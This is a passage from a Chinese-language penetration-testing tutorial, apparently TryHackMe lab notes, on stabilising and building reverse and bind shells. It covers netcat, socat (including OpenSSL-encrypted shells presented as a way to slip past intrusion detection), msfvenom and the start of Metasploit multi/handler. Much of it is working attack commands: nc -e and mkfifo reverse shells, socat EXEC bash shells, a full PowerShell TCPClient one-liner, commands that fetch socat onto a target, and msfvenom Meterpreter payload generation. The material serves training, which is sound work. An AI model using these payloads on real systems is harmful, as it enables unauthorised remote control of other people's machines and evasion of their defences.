<p>默认情况下，这些shell非常不稳定，按下 Ctrl + C 就会杀死整个Netcat程序，而且它们是非交互的，经常会有奇怪的格式错误。这是因为 netcat“shell”实际上是在终端内运行的进程，而不是真正的终端本身。</p>
<p>幸运的是，在 Linux 系统上有许多稳定 netcat shell 的方法，我们会在这里提到三个。Windows反向shell的稳定化往往要困难得多，然而，我们将要在这里介绍的第二个技巧对它也特别有用。</p>
<h2 id="技巧1-python">技巧1: Python</h2>
<p>我们将讨论的第一种技巧只适用于 Linux 机器，因为在默认情况下Linux机器几乎总是会安装 Python。<br>
这是一个分为三个阶段的过程（shell稳定化的前提是已经获得或者连接到shell）:</p>
<ol>
<li>首先要做的是使用命令：<code>python -c 'import pty;pty.spawn("/bin/bash")'</code><br>
它将使用 Python 产生一个功能更好的 bash shell 。<br>
请注意，有些目标可能需要指定Python 版本，如果是这样的话：根据需要将 python 替换为 python2 或 python3 。<br>
这时我们的 shell 会看起来更好一些，但是我们仍然不能使用tab键自动补全功能或者方向键功能,按下Ctrl + C 仍然会杀死这个shell 。</li>
<li>第二步是：执行<code>export TERM=xterm</code> ，这将使我们能够访问一些术语命令，例如clear命令。</li>
<li>最后(也是最重要的) ，我们将使用 Ctrl + Z按键对 shell 进行后台化处理，对shell后台化之后再前台化：用 <code>stty raw -echo; fg</code> 回到我们自己的终端前台。<br>
执行上面的前台化命令，将会做两件事: 首先，这个前台化命令会关闭我们自己本身的终端输出 (它允许我们访问tab键自动补全、方向键和按下 Ctrl + C 终止进程)，然后再将之前建立的反向shell 前台化，从而完成稳定化过程。</li>
</ol>
<p>完整的过程如下（实质上是用反向shell取代了我们自己原来使用的终端）：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324105811487.png" alt="image-20240324105811487"></p>
<p>注意：如果 shell 失效，你的终端中的任何输入都将不可见(这是由于原终端回显被禁用)。要解决这个问题，请输入<code>reset</code>命令，然后按下回车键。</p>
<h2 id="技巧2-rlwrap">技巧2: rlwrap</h2>
<p>rlwrap是一个程序，简单地说，它可以让我们在捕获到shell时立即访问历史记录、 tab自动补全键和方向键；然而，如果你想在这个shell 中使用 Ctrl + C，还是必须使用一些其他技巧进一步稳定化shell。</p>
<p>默认情况下，kali没有安装rlwrap，所以如果要在kali中使用rlwrap，请先安装一下：</p>
<pre><code class="hljs scss">sudo apt install rlwrap</code></pre>
<p>要使用 rlwrp，我们需要调用一个稍微不同的监听器:</p>
<pre><code class="hljs scss">rlwrap nc -lvnp &lt;port&gt;</code></pre>
<p>在netcat监听器前面加上" rlwrap "可以提供一个功能更全面的 shell。这个技巧在处理 Windows的shell时特别有用，因为众所周知，Windows的shell很难稳定。</p>
<p>在处理 Linux 目标时，可以使用与前面第一个技巧中的第三个步骤相同的方法来完全稳定化shell：先用 Ctrl + Z 后台化 shell，然后再使用<code>stty raw-echo; fg</code> 命令来稳定化并重新进入 shell。</p>
<h2 id="技巧3-socat">技巧3: Socat</h2>
<p>稳定shell的第三个简单方法是使用一个初始的 netcat shell作为进入功能更全面的 socat shell的垫脚石。请记住，这种技巧最好是针对 Linux 目标，因为 Windows 上的 Socat shell 不会比 netcat shell 更稳定。</p>
<p>为了实现这种稳定方法，我们首先需要将一个 socat 静态编译的二进制文件(编译为没有依赖关系的程序的一个版本)传输到目标机器上。一个典型的实现方法是：让攻击机在包含 socat 二进制文件的目录中开启一个简易的webserver(<code>sudo python3 -m http.server 80</code>)。然后在目标机器上使用netcat shell界面下载文件，在 Linux 上，这可以通过 curl 或 wget (<code>wget &lt;LOCAL-IP&gt;/socat -O /tmp/socat</code>)来完成。</p>
<p>为了完整性起见，在这里附上目标机是Windows操作系统的情况:</p>
<p>在一个 Windows CLI（命令行）环境中，同样的事情（下载socat文件）也可以在 Powershell 中完成，使用 Invoke-WebRequest 或者 webrequest 系统类，</p>
<p>这取决于安装的 Powershell 版本(<code>Invoke-WebRequest -uri &lt;LOCAL-IP&gt;/socat.exe -outfile C:\\Windows\temp\socat.exe</code>)。</p>
<p>在接下来的小节中，我们将介绍使用Socat发送和接收shell的语法。</p>
<blockquote>
<p>socat二进制文件下载地址（点击将自动下载）：<br>
<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/socat">https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/socat</a><br>
socat官网：<br>
<a target="_blank" rel="noopener" href="http://www.dest-unreach.org/">http://www.dest-unreach.org/</a></p>
</blockquote>
<p>使用以上任何一种技术，都可以更改终端 tty 大小，这是你的终端在使用常规 shell 时会自动完成的事情; 但是，如果你想打开类似文本编辑器的东西来覆盖屏幕上的所有内容（即：在终端中打开文本编辑器），那么必须在反向或绑定 shell 中手动完成终端界面宽高尺寸的更改。</p>
<p>首先，打开另一个终端并运行 stty-a ，这将为你提供大量的输出流，记下开头部分" 行 “和” 列 "的值:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324111042250.png" alt="image-20240324111042250"></p>
<p>接下来，在反向/绑定 shell 中输入以下两个命令:</p>
<pre><code class="hljs scss">stty rows &lt;number&gt;
<span class="hljs-selector-id">#and</span>
stty cols &lt;number&gt;</code></pre>
<p>填写你刚才在自己的终端上运行 stty-a 命令所得到的行和列的值。</p>
<p>这将改变反向/绑定shell界面的宽度和高度，从而使一些程序，如文本编辑器，能够依赖于这些宽高信息的准确性来正确地打开。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324111226451.png" alt="image-20240324111226451"></p>
<h1 id="0x06-socat">0x06 Socat</h1>
<p>Socat 在某些方面与 netcat 相似，但在其他许多方面有根本不同。理解socat 的最简单方法是把它当做一个两点之间的连接器。这两个点实际上可以是一个监听端口和键盘，也可以是一个监听端口和一个文件，或者可以是两个监听端口，而socat 所做的只是提供两点之间的链接。</p>
<p>让我们再次从反向 shell 开始。</p>
<h2 id="reverse-shells反向shell">Reverse Shells（反向shell）</h2>
<p>如前所述，socat 的语法比 netcat 的语法难得多，下面是在socat 中设置反向 shell 监听器的基本语法:</p>
<pre><code class="hljs scss">socat TCP-L:&lt;port&gt; -</code></pre>
<p>在socat中，这需要获取两个点(一个监听端口和一个标准输入)并将它们连接在一起，如此建立的 shell 是不稳定的，但它可以在 Linux 或 Windows 上工作，相当于Netcat中的 <code>nc -lvnp &lt;port&gt;</code>.</p>
<p>在Windows操作系统的目标机上，我们使用这个命令来连接攻击机:</p>
<pre><code class="hljs scss">socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; EXEC:powershell.exe,pipes</code></pre>
<p>“pipes”选项用于强制 powershell (或 cmd.exe)使用 Unix 风格的标准输入和输出形式。</p>
<p>在Linux系统的目标机上，使用以下命令来连接攻击机：</p>
<pre><code class="hljs scss">socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; EXEC:<span class="hljs-string">"bash -li"</span></code></pre>
<h2 id="bind-shells绑定shell">Bind Shells（绑定shell）</h2>
<p>在 Linux 目标上，我们将使用以下命令设置监听器:</p>
<pre><code class="hljs scss">socat TCP-L:&lt;PORT&gt; EXEC:<span class="hljs-string">"bash -li"</span></code></pre>
<p>在 Windows 目标上，我们将使用以下命令设置监听器:</p>
<pre><code class="hljs scss">socat TCP-L:&lt;PORT&gt; EXEC:powershell.exe,pipes</code></pre>
<p>我们使用" pipes "参数来连接 Unix 和 Windows 在 CLI （命令行）环境中处理输入和输出的方式。</p>
<p>不管目标是什么，我们在攻击机器上使用以下命令来连接到 正在目标机上等待的监听器：</p>
<pre><code class="hljs scss">socat TCP:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt; -</code></pre>
<p>现在让我们看看 Socat 更强大的用途之一：建立完全稳定的 Linux tty 反向 shell。这仅在目标是 Linux 时有效，会建立一个更稳定的反向shell。</p>
<p>如前所述，socat 是一个非常通用的工具，以下技巧可能是其最有用的应用之一，这是新的监听器设置语法：</p>
<pre><code class="hljs scss">socat TCP-L:&lt;port&gt; FILE:`tty`,raw,echo=<span class="hljs-number">0</span></code></pre>
<p>让我们分析此命令，像往常一样，我们将两个点连接在一起，但是在这里的点是监听端口和文件。</p>
<p>具体地说，我们将当前的 TTY （TTY含义为：终端）作为文件传递并将它的回显设置为零。这大约相当于使用 Ctrl + Z以及netcat shell 的<code>stty raw -echo; fg</code>技巧，这样处理的额外好处是能够立即建立一个稳定的shell并能连接到完整的 tty（终端）。</p>
<p>普通的socat监听器可以连接到任何有效负载；然而，上面这个特殊的监听器必须用一个非常具体的 socat 命令来激活，这意味着目标机必须安装 socat。</p>
<p>大多数机器默认情况下没有安装socat，但是，我们可以上传一个预编译的socat二进制文件，然后继续正常执行我们的命令。</p>
<blockquote>
<p>预编译的socat二进制文件：<a target="_blank" rel="noopener" href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true">https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true</a></p>
</blockquote>
<p>特殊命令如下：</p>
<pre><code class="hljs scss">socat TCP:&lt;attacker-ip&gt;:&lt;attacker-port&gt; EXEC:<span class="hljs-string">"bash -li"</span>,pty,stderr,sigint,setsid,sane</code></pre>
<p>这是一个很复杂的命令，所以让我们分解一下。</p>
<p>第一部分很简单——我们正在 与在我们自己的攻击机上运行的监听器进行连接，第二部分使用 EXEC:“bash -li” 创建一个交互式 bash 会话，我们还传递了参数：pty、stderr、sigint、setsid 和 sane</p>
<ul>
<li><strong>pty</strong>：在目标上分配一个伪终端——这是稳定化过程的一部分</li>
<li><strong>stderr</strong>：确保在 shell 中能够显示错误消息（通常是非交互式 shell 的问题）</li>
<li><strong>sigint</strong>：将任何 Ctrl + C 命令传递到子进程中，允许我们在 shell 中使用 Ctrl+C 终止命令</li>
<li><strong>setsid</strong>：在新会话中创建进程</li>
<li><strong>sane</strong>：稳定终端，试图将终端“正常化”。</li>
</ul>
<p>这看起来有很多东西需要考虑，所以让我们看看它的实际效果。</p>
<p>在左边我们有一个监听器运行在我们的本地攻击机上，在右边我们有一个已经建立好的反向shell，正在使用非交互式 shell 运行。我们使用非交互式的netcat shell，执行特殊的 socat 命令，并在左侧的 socat 监听器中接收一个完全交互式的 bash shell:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324114025471.png" alt="image-20240324114025471"></p>
<p>请注意，socat shell 是完全交互式的，允许我们使用交互式命令，例如 SSH。 然后我们还可以通过 设置上一个小节中所提到的 stty 值来进一步改进shell，这将让我们能够更好地使用文本编辑器，如 Vim 或 Nano。</p>
<p>如果socat shell 突然无法正常工作，则可以通过在命令中添加 <code>-d -d</code> 来增加信息输出的详细程度，这在实验环境下非常有用，但在一般用途中通常不是必需的。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324114138826.png" alt="image-20240324114138826"></p>
<h1 id="0x07-socat加密shell">0x07 Socat加密shell</h1>
<p>Socat 的许多优点之一就是它能够创建加密的 shell ——绑定shell和反向shell。除非你有解密密钥，否则无法监视加密的 shell，这样通常能够绕过 IDS检测。</p>
<p>我们在前面讨论了如何创建基本的 shell，因此在这里不再讨论一些基本语法。</p>
<p>可以说，只要把 <code>TCP</code> 用作命令的一部分，就应该在使用加密shell 时将其替换为 <code>OPENSSL</code>。 我们将在本小节结束时介绍一些示例，但首先让我们谈谈证书。</p>
<h2 id="加密反向shell">加密反向shell</h2>
<p>为了建立加密的shell，我们首先需要生成一个证书，这在我们的攻击机上很容易做到:</p>
<pre><code class="hljs scss">openssl req <span class="hljs-attr">--newkey</span> rsa:<span class="hljs-number">2048</span> -nodes -keyout shell.key -x509 -days <span class="hljs-number">362</span> -out shell.crt</code></pre>
<p>该命令会创建一个2048位的 RSA 密钥，以及一个匹配的 cert 文件，有自签名且有效期不到一年。当你运行此命令时，它将要求你填写有关证书的信息，你可以留空，也可以随机填写。</p>
<p>然后，我们需要将刚才两个创建的文件合并到一个.pem 文件中:</p>
<pre><code class="hljs scss">cat shell<span class="hljs-selector-class">.key</span> shell<span class="hljs-selector-class">.crt</span> &gt; shell<span class="hljs-selector-class">.pem</span></code></pre>
<p>现在，当我们设置反向 shell 监听器时，可以使用以下命令:</p>
<pre><code class="hljs scss">socat OPENSSL-LISTEN:&lt;PORT&gt;,cert=shell.pem,verify=<span class="hljs-number">0</span> -</code></pre>
<p>这将使用我们生成的证书设置一个 OPENSSL 监听器，参数 verify=0 告诉连接不要费心尝试验证我们的证书是否已由公认的权威机构正确签名。 请注意，证书必须在正在监听的设备上使用（即：有监听器的地方就要有PEM文件）。</p>
<p>设置好监听器后，为了回连到该监听器，我们将使用:</p>
<pre><code class="hljs scss">socat OPENSSL:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt;,verify=<span class="hljs-number">0</span> EXEC:/bin/bash</code></pre>
<h2 id="加密绑定shell">加密绑定shell</h2>
<p>建立加密的绑定 shell 也采用 和上面同样的技巧:</p>
<p><em>目标机上</em></p>
<pre><code class="hljs scss">socat OPENSSL-LISTEN:&lt;PORT&gt;,cert=shell.pem,verify=<span class="hljs-number">0</span> EXEC:cmd.exe,pipes</code></pre>
<p><em>攻击机上</em></p>
<pre><code class="hljs scss">socat OPENSSL:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt;,verify=<span class="hljs-number">0</span> -</code></pre>
<p>再次注意：即使是针对 Windows 目标机建立绑定shell，证书也必须与监听器一起使用，因此需要为绑定 shell 复制 PEM 文件。</p>
<p>下图显示了来自 Linux 目标的 OPENSSL 反向 shell， 左边是攻击机终端界面，右边是已经建立的非交互式反向shell界面（右边的listener是自定义的别名）：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324114828531.png" alt="image-20240324114828531"></p>
<p>这种加密技巧也适用于上一个小节中介绍的特殊的、仅限 Linux 的 TTY（终端）反向shell —— 弄清楚它的语法将是本小节答题的关键。</p>
<pre><code class="hljs scss">socat OPENSSL-LISTEN:<span class="hljs-number">53</span>,cert=encrypt.pem,verify=<span class="hljs-number">0</span> FILE:`tty`,raw,echo=<span class="hljs-number">0</span>                #对socat tty技巧的加密处理--设置攻击机上的监听器
socat  OPENSSL:<span class="hljs-number">10.10</span>.<span class="hljs-number">10.5</span>:<span class="hljs-number">53</span>,verify=<span class="hljs-number">0</span>  EXEC:<span class="hljs-string">"bash -li"</span>,pty,stderr,sigint,setsid,sane   #对socat tty技巧的加密处理--让目标机</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324115749745.png" alt="image-20240324115749745"></p>
<h1 id="0x08-常用shell-payload">0x08 常用shell payload</h1>
<p>之前有提到我们正在寻找一些方法来使用 netcat 作为绑定 shell 的监听器，所以我们将从它开始。</p>
<p>在 netcat 的某些版本中，包括Windows 版的nc.exe（Kali Linux也附带了，位于 /usr/share/windows-resources/binaries），还有 Kali 本身使用的版本，即netcat-traditional，都有一个 -e 选项允许你在shell的连接上执行进程。</p>
<p>例如，在目标机上设置监听器时：</p>
<pre><code class="hljs scss">nc -lvnp &lt;PORT&gt; -e /bin/bash</code></pre>
<p>用 netcat 连接到上面的监听器将在目标上产生一个绑定 shell。</p>
<p>同样，对于反向 shell，在目标机上执行以下命令：</p>
<pre><code class="hljs scss">nc &lt;LOCAL-IP&gt; &lt;PORT&gt; -e /bin/bash</code></pre>
<p>目标机将回连攻击机上的监听器，这样会产生一个反向 shell。</p>
<p>但是，大多数版本的 netcat 都不包含此功能（指 -e选项），因为人们普遍认为它非常不安全。<br>
在几乎总是需要静态二进制文件的 Windows目标机上，以上技巧（指 -e选项）将完美运行；然而，在 Linux的目标机上，我们将改为使用以下代码为绑定 shell 创建一个监听器：</p>
<pre><code class="hljs scss">mkfifo /tmp/f; nc -lvnp &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>; rm /tmp/f     #在linux目标机上执行</code></pre>
<p>以下段落是此命令的技术说明——命令本身才是最重要的。</p>
<p>该命令首先会在 /tmp/f 处创建命名管道（FIFO–First In，First Out），然后它启动一个 netcat 监听器，并将监听器的输入连接到命名管道的输出。netcat 监听器的输出（即我们发送的命令）再直接通过管道（管道符" | "）传输到 sh，将 stderr 输出流发送到 stdout，并将 stdout 本身发送到命名管道的输入，从而完成循环。</p>
<p>关于命名管道的介绍：<a target="_blank" rel="noopener" href="https://www.linuxjournal.com/article/2156">https://www.linuxjournal.com/article/2156</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324120207677.png" alt="image-20240324120207677"></p>
<p>一个非常类似的命令可以用来发送 netcat 反向 shell:</p>
<pre><code class="hljs scss">mkfifo /tmp/f; nc &lt;LOCAL-IP&gt; &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>; rm /tmp/f     #在linux目标机上执行</code></pre>
<p>这个命令实际上与前一个命令相同，只是此命令将使用 netcat 主动连接语法，而不是使用 netcat 监听语法。(下图示例中的左侧使用了自定义别名)</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324120249831.png" alt="image-20240324120249831"></p>
<p>当目标是一个现代的 Windows Server 时，建立 Powershell 反向 shell 是非常常见的，因此我们将在这里介绍标准的一行 PSH 反向 shell。</p>
<p>这个命令非常复杂，因此为了简单起见，这里不会直接解释它，记住，这是一行非常有用的命令:</p>
<pre><code class="hljs scss">powershell -c "<span class="hljs-variable">$client</span> = New-<span class="hljs-selector-tag">Object</span> System<span class="hljs-selector-class">.Net</span><span class="hljs-selector-class">.Sockets</span><span class="hljs-selector-class">.TCPClient</span>('&lt;ip&gt;',&lt;port&gt;);<span class="hljs-variable">$stream</span> = <span class="hljs-variable">$client</span><span class="hljs-selector-class">.GetStream</span>();<span class="hljs-selector-attr">[byte[]</span>]<span class="hljs-variable">$bytes</span> = <span class="hljs-number">0</span>.<span class="hljs-selector-class">.65535</span>|%{<span class="hljs-number">0</span>};<span class="hljs-built_in">while</span>(($i = $stream.Read($bytes, <span class="hljs-number">0</span>, $bytes.Length)) -ne <span class="hljs-number">0</span>){;<span class="hljs-variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding)<span class="hljs-selector-class">.GetString</span>($bytes,<span class="hljs-number">0</span>, $i);<span class="hljs-variable">$sendback</span> = (iex $data <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | Out-String );<span class="hljs-variable">$sendback2</span> = <span class="hljs-variable">$sendback</span> + 'PS ' + (pwd)<span class="hljs-selector-class">.Path</span> + '&gt; ';<span class="hljs-variable">$sendbyte</span> = ([text.encoding]::ASCII)<span class="hljs-selector-class">.GetBytes</span>($sendback2);<span class="hljs-variable">$stream</span><span class="hljs-selector-class">.Write</span>($sendbyte,<span class="hljs-number">0</span>,$sendbyte.Length);<span class="hljs-variable">$stream</span><span class="hljs-selector-class">.Flush</span>()};<span class="hljs-variable">$client</span><span class="hljs-selector-class">.Close</span>()"</code></pre>
<p>为了使用它，我们需要用适当的 IP 和端口选择来替换"<code>&lt;IP&gt;</code>" 和 “<code>&lt;port&gt;</code>”，然后将其复制到 cmd.exe shell中并执行该命令（或者使用 在 Windows 服务器上执行命令的另一种方法，例如 webshell），从而生成反向 shell：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324120352118.png" alt="image-20240324120352118"></p>
<p>对于其他常见的反向 shell 有效载荷，可以参考github上的PayloadsAllTheThings存储库，其中包含了多种不同语言的 shell 代码（通常以单行格式进行复制和粘贴）。</p>
<blockquote>
<p>PayloadAllTheThings项目链接：<br>
<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md</a></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324120523825.png" alt="image-20240324120523825"></p>
<h1 id="0x09-msfvenom生成shell-payload">0x09 Msfvenom生成shell payload</h1>
<p>Msfvenom作为 Metasploit 框架的一部分，主要用于生成用于反向和绑定 shell 的代码。 它被广泛用于开发低等级的exp，如：在开发缓冲区溢出漏洞exp时生成十六进制 shellcode；但是，它也可用于生成各种格式的有效负载（例如 .exe、.aspx、.war、.py）。 我们将在本节中使用Msfvenom的后一个功能。</p>
<p>msfvenom 的标准语法如下：</p>
<pre><code class="hljs scss">msfvenom -<span class="hljs-selector-tag">p</span> &lt;PAYLOAD&gt; &lt;OPTIONS&gt;</code></pre>
<p>例如，要以 exe 格式生成 Windows x64反向 Shell，我们可以使用:</p>
<pre><code class="hljs scss">msfvenom -<span class="hljs-selector-tag">p</span> windows/x64/shell/reverse_tcp -f exe -o shell<span class="hljs-selector-class">.exe</span> LHOST=&lt;listen-IP&gt; LPORT=&lt;listen-port&gt;</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324121003377.png" alt="image-20240324121003377"></p>
<p>这里我们设定一个有效载荷涉及到四个参数选项:</p>
<ul>
<li><code>-f &lt;format&gt;</code>:指定输出格式。 在上面的命令中，格式是一个可执行文件 (exe)</li>
<li><code>-o &lt;file&gt;</code>:生成的有效载荷（payload）的输出位置和文件名。</li>
<li><code>LHOST=&lt;IP&gt;</code>:指定要回连的 IP（即攻击机IP）。 当你使用 TryHackMe 的VPN连接到你自己的攻击机时，这将是你的 tun0 IP 地址。</li>
<li><code>LPORT=&lt;port&gt;</code>:要回连的本地攻击机上的端口。 可以是 0 到 65535 之间尚未使用的任何值；但是设定为低于 1024 的端口时将受到限制，需要以 root 权限运行监听器。</li>
</ul>
<p><strong>Staged vs Stageless</strong>（分段和不分段）</p>
<p>在我们进一步讨论之前，必须介绍另外两个概念：分段的反向 shell 有效负载、不分段的反向 shell 有效负载。</p>
<ul>
<li>分段的反向shell有效载荷分两部分发送。第一部分称为stager，这是一段直接在服务器本身上执行的代码，它会回连攻击机上等待的监听器，但它本身并不包含任何反向 shell 代码。第一部分的stager将连接到监听器并使用连接来加载真正的有效载荷，这样能直接执行真正的payload并防止真正的payload接触到磁盘，以免被传统的反病毒解决方案拦截。 因此，此类有效载荷分为两部分——一个小的初始段，然后是在初始段启动时所下载的更大的反向 shell 代码段。 分段的有效载荷需要一个特殊的监听器——通常是Metasploit multi/handler，这将在下一个小节中介绍。</li>
<li>不分段的反向shell有效载荷更常见——这些也是我们迄今为止一直在使用的。 它们是完全独立的，因为在成功执行一段代码时会立即将 shell 发送回攻击机上等待的监听器。</li>
</ul>
<p>不分段的有效载荷往往更易于使用和捕获； 但是，它们也更庞大，并且更容易被防病毒或入侵检测程序发现和删除。</p>
<p>分段的有效载荷更难使用，但它的初始段要短得多，有时会被效率较低的防病毒软件遗漏。 现代防病毒解决方案还将利用反恶意软件扫描接口 (AMSI：Anti-Malware Scan Interface) 来检测有效载荷，这使得分段有效载荷不如以前那么有效。</p>
<p><strong>Meterpreter</strong>（英文意思是翻译器）</p>
<p>关于 Metasploit，另一个要讨论是 Meterpreter shell。 Meterpreter shell 是 Metasploit自带的的全功能 shell，它们是完全稳定的，这使得它们在针对Windows 目标机时效果非常好。Meterpreter shell 也有很多自己的内置功能，例如文件上传和下载。 如果我们想使用Metasploit 的后渗透工具，那么我们就需要先获得一个 Meterpreter shell。</p>
<p>Meterpreter shell 的缺点是它们必须在 Metasploit中才能捕获，它们也被某些认证考试禁止使用，因此学习关于Meterpreter的替代方法是个好主意。</p>
<p><strong>有效载荷（payload）命名约定</strong></p>
<p>使用 msfvenom 时，了解命名系统的工作原理很重要，基本的payload命名约定如下：</p>
<pre><code class="hljs scss">&lt;OS&gt;/&lt;arch&gt;/&lt;payload&gt;</code></pre>
<p>例如:</p>
<blockquote>
<p>linux/x86/shell_reverse_tcp</p>
</blockquote>
<p>这将为 x86 Linux 的目标机生成不分段的反向shell payload。</p>
<p>此基本命名约定的例外是Windows 32位操作系统的目标，对于该类目标，命名payload时，不会指定操作系统的架构位数，例如：</p>
<blockquote>
<p>windows/shell_reverse_tcp</p>
</blockquote>
<p>对于64位的 Windows 目标，命名payload时，arch 将被指定为normal (x64) 。</p>
<p>我们把命名中关于payload的部分再细分一下。</p>
<p>在上面的示例中，使用的payload是 <code>shell_reverse_tcp</code>， 这表明它是一个不分段的payload。不分段的payload会用下划线 (_) 表示，与此payload等效的分段payload是：<code>shell/reverse_tcp</code>（分段payload会用一个斜杠/表示）。</p>
<p>这些规则也适用于 Meterpreter payload。一个针对Windows 64位目标的分段Meterpreter payload ，名称将如下所示：</p>
<blockquote>
<p>windows/x64/meterpreter/reverse_tcp</p>
</blockquote>
<p>针对Linux 32位目标的不分段 Meterpreter payload，名称将如下所示：</p>
<blockquote>
<p>linux/x86/meterpreter_reverse_tcp</p>
</blockquote>
<p>除了 msfconsole 手册页之外，使用 msfvenom 时要注意的另一个命令是：<code>msfvenom --list payloads</code>，这可用于列出所有可用的有效载荷，然后可以将其通过管道符传输到 grep 以搜索一组特定的有效载荷，例如：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324160725346.png" alt="image-20240324160725346"></p>
<p>这为我们提供了一整套针对 Linux 32位目标的 Meterpreter 有效载荷。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324161500055.png" alt="image-20240324161500055"></p>
<pre><code class="hljs scss">msfvenom -<span class="hljs-selector-tag">p</span> linux/x64/meterpreter/reverse_tcp -f elf -o shell lhost=<span class="hljs-number">10.10</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.5</span> lport=<span class="hljs-number">443</span></code></pre>
<h1 id="0x10-metasploit-multihandler模块">0x10 Metasploit multi/handler模块</h1>
<p>Multi/Handler 是捕获反向 shell 的绝佳工具（multi/handler模块充当的是连接shell的监听器），如果你想使用 Meterpreter shell，这是必不可少的，并且这也是使用分段payload时的首选。</p>
<p>幸运的是，它相对容易使用:</p>
<ol>
<li>使用" msfconsole "命令启动Metasploit</li>
<li>输入" use multi/handler "命令，按下回车键</li>
</ol>
<p>我们现在准备开始一个multi/handler会话，让我们使用 options 命令查看可用的选项:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324161723719.png" alt="image-20240324161723719"></p>
